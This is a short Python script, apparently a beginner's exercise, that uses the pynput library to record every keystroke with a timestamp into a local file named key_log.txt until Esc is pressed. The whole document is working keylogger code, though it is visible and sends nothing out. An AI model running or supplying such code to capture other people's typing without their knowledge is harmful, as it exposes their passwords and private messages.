#Library
from pynput.keyboard import Key, Listener
#Vanilla
import logging

#make a log file
log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(levelname)s: %(asctime)s: %(message)s: ')

def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        #Stop Listener
        return False

#this says that listener is on
with Listener(on_press=on_press) as listener:
    listener.join()